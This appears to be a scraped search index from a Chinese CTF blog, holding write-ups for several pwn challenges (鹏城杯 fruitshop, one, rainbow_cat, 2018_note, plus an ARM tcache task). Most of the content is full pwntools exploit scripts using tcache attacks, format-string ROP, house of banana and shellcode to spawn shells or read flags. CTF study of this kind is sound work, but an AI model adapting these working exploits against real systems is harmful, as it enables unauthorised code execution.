sh.sendafter(&#x27;&gt;&#x27;,payload)def delete(index):   size = 0   checksum = index ^ size   content = &#x27;\\x00&#x27;   payload = p32(0x11451400)   payload += p32(checksum)   payload += p32(size)   payload += p32(index)   payload += &#x27;\\x00&#x27;*0x38   payload += p8(0x1)   payload += p8(0)*2   payload += &#x27;A\\x01\\x57\\xf5\\x61\\x00&#x27;   sh.sendafter(&#x27;&gt;&#x27;,payload)def edit(index,content):   size = 0   checksum = index ^ size   for x in content:      if x == &#x27;\\00&#x27;:         break      checksum ^= ord(x)   payload = p32(0x11451400)   payload += p32(checksum)   payload += p32(size)   payload += p32(index)   payload += content.ljust(0x3a,&#x27;\\x00&#x27;)   payload += p8(1)   payload += &#x27;A\\x01\\x57\\xf5\\x61\\x00&#x27;   sh.sendafter(&#x27;&gt;&#x27;,payload)add(0x4) #0add(0x4) #1add(0x4) #2add(0x4) #3add(0x70) #4add(0x4) #5add(0x4) #6add(0x4) #7add(0x4) #8delete(3)delete(2)#修改tcache sizeedit(0,&#x27;a&#x27;*4 + p8(0x31))delete(1)#overlap chunkadd(0x20) #1#2,3,9~14for i in range(7):   add(0x70)delete(2)delete(3)for i in range(9,14):   delete(i)#unsorted bindelete(4)edit(1,&#x27;b&#x27;*0x8 + p8(0x88))add(0x4) #2#raw_input()add(0x4) #3show(3)sh.recvuntil(&#x27;\\n&#x27;)libc_base = u32(sh.recv(4)) - 0x1507f8system_addr = libc_base + libc.sym[&#x27;system&#x27;]binsh_addr = libc_base + libc.search(&#x27;/bin/sh\\x00&#x27;).next()print &#x27;libc_base=&#x27;,hex(libc_base)print &#x27;system_addr=&#x27;,hex(system_addr)#delete(8)#delete(7)edit(5,&#x27;a&#x27;*0x4 + p8(0x31))delete(6)add(0x20) #4edit(4,&#x27;b&#x27;*0x8 + p32(system_addr) + p32(binsh_addr))#raw_input()show(7)sh.interactive()","categories":["CTF"],"tags":["tcache","off by one","arm"]},{"title":"鹏城杯2022_fruitshop","url":"/2022/07/04/%E9%B9%8F%E5%9F%8E%E6%9D%AF2022-fruitshop/","content":"delete没有清空指针\n\nAdd只能malloc固定规格size到堆\n\n其中add_durian使用calloc，而其他使用malloc，且能够通过切割unsorted bin，产生0x120的small bin chunk\n\n于是可以使用Tcache Stashing Unlink Attack修改tcache_max阀值，将所有的chunk以tcache的形式管理，就能够使用tcache attack进行任意地址分配\n#coding:utf8from pwn import *#sh = process(&#x27;./fruitshop_patch&#x27;)#sh = process(&#x27;./fruitshop&#x27;)sh = remote(&#x27;192.168.1.107&#x27;,8888)libc = ELF(&#x27;./libc-2.31.so&#x27;)def add(type,index,content):   sh.sendlineafter(&#x27;&gt;&#x27;,&#x27;1&#x27;)   sh.sendlineafter(&#x27;:&#x27;,type)   sh.sendlineafter(&#x27;:&#x27;,str(index))   sh.sendafter(&#x27;:&#x27;,content)def edit(type,index,content):   sh.sendlineafter(&#x27;&gt;&#x27;,&#x27;2&#x27;)   sh.sendlineafter(&#x27;:&#x27;,type)   sh.sendlineafter(&#x27;:\\n&#x27;,str(index))   if type == &#x27;Apple&#x27;:      if len(content) &lt; 0x200:         sh.sendafter(&#x27;Do~&#x27;,content)         sh.sendafter(&#x27;Re~&#x27;,&#x27;\\n&#x27;)         sh.sendafter(&#x27;Mi~&#x27;,&#x27;\\n&#x27;)         sh.sendafter(&#x27;Fa~&#x27;,&#x27;\\n&#x27;)      else:         sh.sendafter(&#x27;Do~&#x27;,content[0:0x200])         sh.sendafter(&#x27;Re~&#x27;,content[0x200:0xcb0])         sh.sendafter(&#x27;Mi~&#x27;,content[0xcb0:])         #sh.sendlineafter(&#x27;Fa~&#x27;,content[0xdb0:0xdd0])         #sh.sendlineafter(&#x27;Fa~&#x27;,&#x27;&#x27;)   else:      sh.sendafter(&#x27;\\n&#x27;,content)def show(type,index):   sh.sendlineafter(&#x27;&gt;&#x27;,&#x27;3&#x27;)   sh.sendlineafter(&#x27;:&#x27;,type)   sh.sendlineafter(&#x27;:\\n&#x27;,str(index))def delete(type,index):   sh.sendlineafter(&#x27;&gt;&#x27;,&#x27;4&#x27;)   sh.sendlineafter(&#x27;:&#x27;,type)   sh.sendlineafter(&#x27;:\\n&#x27;,str(index))context.log_level = &#x27;debug&#x27;add(&#x27;Apple&#x27;,0,&#x27;a&#x27;*0xdd0)for i in range(6):   add(&#x27;Durian&#x27;,0,&#x27;b&#x27;*0x110)   delete(&#x27;Durian&#x27;,0)add(&#x27;Apple&#x27;,2,&#x27;b&#x27;*0xdd0)show(&#x27;Durian&#x27;,0)sh.recvuntil(&#x27;Content is&#x27;)heap_addr = u64(sh.recv(8))print &#x27;heap_addr=&#x27;,hex(heap_addr)delete(&#x27;Apple&#x27;,0)show(&#x27;Apple&#x27;,0)sh.recvuntil(&#x27;Content is&#x27;)libc_base = u64(sh.recv(8)) - 0x1ecbe0tcache_max = libc_base + 0x1ec2d0system_addr = libc_base +  libc.sym[&#x27;system&#x27;]free_hook_addr = libc_base + libc.sym[&#x27;__free_hook&#x27;]print &#x27;tcache_max=&#x27;,hex(tcache_max)print &#x27;libc_base=&#x27;,hex(libc_base)print &#x27;free_hook_addr=&#x27;,hex(free_hook_addr)sh.recv()sh.sendline(&#x27;&#x27;)add(&#x27;Banana&#x27;,0,&#x27;b&#x27;*0xcb0)add(&#x27;Apple&#x27;,1,&#x27;a&#x27;*0xdd0)add(&#x27;Banana&#x27;,1,&#x27;b&#x27;*0xcb0)delete(&#x27;Apple&#x27;,1)add(&#x27;Banana&#x27;,1,&#x27;b&#x27;*0xcb0)add(&#x27;Apple&#x27;,0,&#x27;a&#x27;*0xdd0)#raw_input()#edit(&#x27;Apple&#x27;,1,&#x27;a&#x27;*0xcb0 + p64(0) + p64(0x121) + p64(heap_addr - 0x5b0) + p64(tcache_max - 0x10))sh.sendlineafter(&#x27;&gt;&#x27;,&#x27;2&#x27;)sh.sendlineafter(&#x27;:&#x27;,&#x27;Apple&#x27;)sh.sendlineafter(&#x27;:\\n&#x27;,&#x27;1&#x27;)sh.sendafter(&#x27;Do~&#x27;,&#x27;a\\n&#x27;)sh.sendafter(&#x27;Re~&#x27;,&#x27;r\\n&#x27;)sh.sendafter(&#x27;Mi~&#x27;,p64(0) + p64(0x121) + p64(heap_addr - 0x5b0) + p64(tcache_max - 0x10) + &#x27;\\n&#x27;)sh.sendafter(&#x27;Fa~&#x27;,&#x27;r\\n&#x27;)#Tcache Stashing Unlink Attack修改tcache_maxadd(&#x27;Durian&#x27;,0,&#x27;d&#x27;*0x110)#tcache attackdelete(&#x27;Apple&#x27;,0)delete(&#x27;Apple&#x27;,2)edit(&#x27;Apple&#x27;,2,p64(free_hook_addr) + &#x27;\\n&#x27;)add(&#x27;Apple&#x27;,0,&#x27;/bin/sh\\x00\\n&#x27;)add(&#x27;Apple&#x27;,1,p64(system_addr) + &#x27;\\n&#x27;)#getshelldelete(&#x27;Apple&#x27;,0)sh.interactive()","categories":["CTF"],"tags":["tcache","Tcache Stashing Unlink Attack","tcache_max阀值","glibc 2.31"]},{"title":"鹏城杯2022_one","url":"/2022/07/04/%E9%B9%8F%E5%9F%8E%E6%9D%AF2022-one/","content":"格式化字符串漏洞\n\n利用格式化字符串改写main函数的栈中rbp，并将返回地址改为leave ret的地址，这样main函数返回时就可以栈迁移到可控区\n#coding:utf8from pwn import *#sh = process(&#x27;./one&#x27;,env = &#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc-2.31.so&#x27;&#125;)sh = remote(&#x27;192.168.1.106&#x27;,9999)elf = ELF(&#x27;./one&#x27;)sh.recvuntil(&#x27;gift:&#x27;)stack_addr = int(sh.recvuntil(&#x27;\\n&#x27;,drop = True),16)sh.sendafter(&#x27;name:&#x27;,&#x27;a&#x27;*0x8)sh.sendafter(&#x27;password:&#x27;,&#x27;b&#x27;*0x8)sh.recvuntil(&#x27;a&#x27;*0x8)elf_base = u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;)) - 0x11a0leave_ret = elf_base + 0x1409print &#x27;elf_base=&#x27;,hex(elf_base)print &#x27;stack_addr=&#x27;,hex(stack_addr)payload = &#x27;%&#x27; + str( (stack_addr + 0x18) &amp; 0xffff) + &#x27;c%9$hn&#x27;.ljust(18,&#x27;a&#x27;) + p64(stack_addr - 0xf0)map = &#123;&#125;rop_addr = stack_addr + 0xd8for i in range(6):   x = rop_addr &amp; 0xff   rop_addr = rop_addr &gt;&gt; 8   map[x] = ifor i in range(6,12):   x = leave_ret &amp; 0xff   leave_ret = leave_ret &gt;&gt; 8   map[x] = imap = sorted(map.items(),key=lambda x:x[0],reverse=False)payload = &#x27;&#x27;pre = 0for x in map:   delta = x[0] - pre   if delta == 0:      payload += &#x27;%&#x27; + str(22 + x[1]) + &#x27;$hhn&#x27;   else:      payload += &#x27;%&#x27; + str(delta) + &#x27;c%&#x27; + str(22 + x[1]) + &#x27;$hhn&#x27;   pre = x[0]print len(payload)payload = payload.ljust(128,&#x27;a&#x27;)for i in range(6):   payload += p64(stack_addr + 0x810 + i)for i in range(6):   payload += p64(stack_addr + 0x818 + i)print payloadprint len(payload)pop_rdi = elf_base + 0x0000000000001543pop_rsi = elf_base + 0x0000000000001541read_addr = elf_base + 0x1190#add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax] ; retgadgets = elf_base + 0x0000000000001272pop_rbx = elf_base + 0x153astdout_ptr = elf_base + 0x4020csu_call = elf_base + 0x1520read_got = elf_base + elf.got[&#x27;read&#x27;]alarm_plt = elf_base + 0x1170pop_rbp = elf_base + 0x0000000000001273bss = elf_base + 0x4050flag_addr = stack_addr + 0x1f8#修改stdout为syscallrop = p64(pop_rbx) + p64(0x100000000 - 0xdee8b) + p64(stdout_ptr + 0x3d) + p64(0)*4rop += p64(gadgets)rop += p64(pop_rdi) + p64(2) + p64(alarm_plt) + p64(pop_rdi) + p64(0) + p64(alarm_plt)rop += p64(pop_rbx) + p64(0) + p64(1) + p64(0)*3 + p64(stdout_ptr)rop += p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(0) + p64(stdout_ptr) + p64(csu_call + 9) + p64(0)next_rop_addr = stack_addr + 0x200rop += p64(0) + p64(1) + p64(0) + p64(next_rop_addr) + p64(0x1000) + p64(read_got)rop += p64(csu_call) + &#x27;flag.txt&#x27;payload += ropprint len(payload)raw_input()sh.sendafter(&#x27;!!!&#x27;,payload)rop = p64(0) + p64(1) + p64(1) + p64(flag_addr) + p64(0x100) + p64(read_got) #readrop += p64(csu_call) + p64(0)rop += p64(0) + p64(1) + p64(2) + p64(flag_addr) + p64(0x100) + p64(stdout_ptr)rop += p64(pop_rdi) + p64(1) + p64(alarm_plt) + p64(alarm_plt)rop += p64(csu_call) + p64(0)raw_input()sh.send(rop)sh.interactive()","categories":["CTF"],"tags":["ROP","格式化字符串漏洞","栈迁移"]},{"title":"鹏城杯2022_rainbow_cat","url":"/2022/07/04/%E9%B9%8F%E5%9F%8E%E6%9D%AF2022-rainbow-cat/","content":"通过patch掉一些无关的语句，就可以使用IDA查看伪代码了，发现delete存在UAF\n\nadd中如果分配的地址超出了ptr范围，会调用exit退出，且add只能malloc(0x10)\n\n可以使用UAF来伪造chunk的size，构造出large bin，然后使用large bin attack攻击rtld_global，即使用house of banana的方法\n#coding:utf8from pwn import *#sh = process(&#x27;./rainbowcat_patch&#x27;)context.log_level = &#x27;debug&#x27;sh = remote(&#x27;192.168.1.102&#x27;,9999)libc = ELF(&#x27;./libc-2.33.so&#x27;)def add(index):   sh.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;1&#x27;)   sh.sendlineafter(&#x27;get?&#x27;,str(index))def delete(index):   sh.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;2&#x27;)   sh.sendlineafter(&#x27;?&#x27;,str(index))def show(index):   sh.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;3&#x27;)   sh.sendlineafter(&#x27;:&#x27;,str(index))def edit(index,content):   sh.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;4&#x27;)   sh.sendlineafter(&#x27;?&#x27;,str(index))   sh.sendafter(&#x27;:&#x27;,content)add(0)add(1)delete(0)delete(1)show(0)sh.recvuntil(&#x27;:&#x27;)key = u64(sh.recv(8))print &#x27;key=&#x27;,hex(key)heap_addr = u64(sh.recv(8))print &#x27;heap_addr=&#x27;,hex(heap_addr)add(1)add(0)#double freedelete(1)edit(1,p64(0)*2)delete(1)edit(1,p64((heap_addr + 0x280) ^ key) + p64(0))add(1)add(1)edit(1,p64(0) + p64(0x461))for i in range(0x22):   add(1)add(2)add(1)#double freedelete(1)edit(1,p64(0)*2)delete(1)edit(1,p64((heap_addr + 0x700) ^ key) + p64(0))add(1)add(1)edit(1,p64(0) + p64(0x451))for i in range(0x22):   add(1)   if i == 0x20 or i == 0x21:      edit(1,&#x27;a&#x27;*0x8 + p64(0x21))for i in range(0x22):   add(1)   edit(1,&#x27;c&#x27;*0x10)delete(0)show(0)sh.recvuntil(&#x27;:&#x27;)libc_base = u64(sh.recv(8)) - 0x1e0c00free_hook_addr = libc_base + libc.sym[&#x27;__free_hook&#x27;]print &#x27;libc_base=&#x27;,hex(libc_base)delete(1)edit(1,p64(0)*2)delete(1)edit(1,p64((heap_addr + 0xb90)^key))add(1)add(0)delete(1)edit(1,p64(0)*2)delete(1)edit(1,p64((heap_addr + 0xb80)^key))add(1)add(1)edit(1,p64(0) + p64(0x421))#发生unsorted bin遍历，0x460的unsorted bin被放入large bindelete(0)add(1)#将剩余的unsorted bin消耗for i in range(0x20):   add(0)#delete(2)_rtld_global_ptr_addr = libc_base + 0x222040print &#x27;_rtld_global_ptr_addr=&#x27;,hex(_rtld_global_ptr_addr)#修改large bin的bk nextsizedelete(1)edit(1,p64(0)*2)delete(1)edit(1,p64((heap_addr + 0x2a0)^key))add(1)add(0)edit(0,p64(0) + p64(_rtld_global_ptr_addr - 0x20))#将0x450的堆释放，属于喂归位的large bindelete(2)#重新伪造一个0x420的chunk，下标为0delete(1)edit(1,p64(0)*2)delete(1)edit(1,p64((heap_addr + 0xb90)^key))add(1)add(0)delete(1)edit(1,p64(0)*2)delete(1)edit(1,p64((heap_addr + 0xb80)^key))add(1)add(1)edit(1,p64(0) + p64(0x421))#发生unsorted bin遍历，large bin attack!!delete(0)add(1)def write_heap(addr,content):   delete(1)   edit(1,p64(0)*2)   delete(1)   edit(1,p64(addr^key))   add(1)   add(0)   edit(0,content)fake_rtld_global_addr = heap_addr + 0x700retn = libc_base + 0x52a92set_context = libc_base + 0x529adpop_rdi = libc_base + 0x0000000000028a55pop_rsi = libc_base + 0x000000000002a4cfpop_rdx = libc_base + 0x00000000000c7f32open_addr = libc_base + libc.sym[&#x27;open&#x27;]read_addr = libc_base + libc.sym[&#x27;read&#x27;]write_addr = libc_base + libc.sym[&#x27;write&#x27;]opendir_addr = libc_base + libc.sym[&#x27;opendir&#x27;]readdir_addr = libc_base + libc.sym[&#x27;readdir&#x27;]mov_p_rdi_rax = libc_base + 0x0000000000041a03#mov rdi, qword ptr [rdi + 0xe0] ; jmp raxmov_rdi_p_rdi = libc_base + 0x000000000007efddpop_rax = libc_base + 0x0000000000044c70write_heap(fake_rtld_global_addr,p64(0)*2)write_heap(fake_rtld_global_addr + 0x10,p64(0) + p64(libc_base + 0x2237d0))write_heap(fake_rtld_global_addr + 0x20,p64(0) + p64(fake_rtld_global_addr))write_heap(fake_rtld_global_addr + 0x110,p64(fake_rtld_global_addr + 0x8*0x24) + p64(0))write_heap(fake_rtld_global_addr + 0x120,p64(fake_rtld_global_addr + 0x8*0x25) + p64(fake_rtld_global_addr + 0x8*0x32))write_heap(fake_rtld_global_addr + 0x130,p64(0x10)) #func countwrite_heap(fake_rtld_global_addr + 0x190,p64(set_context) + p64(retn))write_heap(fake_rtld_global_addr + 0x230,p64(0) + p64(fake_rtld_global_addr + 0x40)) #new rspwrite_heap(fake_rtld_global_addr + 0x240,p64(pop_rdi))write_heap(fake_rtld_global_addr + 0x310,p64(0) + p32(0) + p32(0x8))#ropflag_addr = fake_rtld_global_addr + 0xd0write_heap(fake_rtld_global_addr + 0x40,p64(flag_addr) + p64(pop_rsi))write_heap(fake_rtld_global_addr + 0x50,p64(0) + p64(open_addr))write_heap(fake_rtld_global_addr + 0x60,p64(pop_rdi) + p64(3))write_heap(fake_rtld_global_addr + 0x70,p64(pop_rsi) + p64(flag_addr))write_heap(fake_rtld_global_addr + 0x80,p64(pop_rdx) + p64(0x100))write_heap(fake_rtld_global_addr + 0x90,p64(read_addr) + p64(pop_rdi))write_heap(fake_rtld_global_addr + 0xa0,p64(1) + p64(pop_rsi))write_heap(fake_rtld_global_addr + 0xb0,p64(flag_addr) + p64(pop_rdx))write_heap(fake_rtld_global_addr + 0xc0,p64(0x100) + p64(write_addr))write_heap(fake_rtld_global_addr + 0xd0,&#x27;./flag\\x00&#x27;)#trigger exitdelete(1)edit(1,p64(0)*2)delete(1)edit(1,p64(free_hook_addr^key))add(0)raw_input()add(0)sh.interactive()","categories":["CTF"],"tags":["UAF","large bin","house of banana","glibc 2.33"]},{"title":"鹏城杯_2018_note","url":"/2020/07/24/%E9%B9%8F%E5%9F%8E%E6%9D%AF_2018_note/","content":"首先，检查一下程序的保护机制\n\n\n然后，我们用IDA分析一下，在edit功能里，index的值可以被nptr溢出覆盖，因此，我们可以控制index的值，这样，我们就可以在GOT里写入一个堆地址。\n\n\n由于没有开启NX保护，我们只需要再在堆里布置shellcode即可。\n#coding:utf8from pwn import *context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;)#sh = process(&#x27;./2018_note&#x27;)sh = remote(&#x27;node3.buuoj.cn&#x27;,28075)def add(index,size,content):   sh.sendline(&#x27;1&#x27;)   sleep(0.01)   sh.sendline(str(index))   sleep(0.01)   sh.sendline(size)   sleep(0.01)   sh.sendline(content)#溢出覆盖index，使得heap[i]对应exit的got表，这样就能将exit的got表修改为一个heap地址payload = &#x27;13&#x27;.ljust(0xA,&#x27;\\x00&#x27;) + p32(0xFFFFFFF8)sc1 = asm(&#x27;&#x27;&#x27;mov rax,0x0068732f6e69622f             jmp $+0x16          &#x27;&#x27;&#x27;)add(0,payload,sc1)sc2 = asm(&#x27;&#x27;&#x27;push rax             xor rax,rax             mov al,0x3B             mov rdi,rsp             jmp $+0x17          &#x27;&#x27;&#x27;)add(1,&#x27;13&#x27;,sc2)sc3 = asm(&#x27;&#x27;&#x27;xor rsi,rsi             xor rdx,rdx             syscall          &#x27;&#x27;&#x27;)add(2,&#x27;13&#x27;,sc3)#getshellsh.sendline(&#x27;5&#x27;)sh.interactive()","categories":["CTF"],"tags":["变量覆盖","下标越界"]}]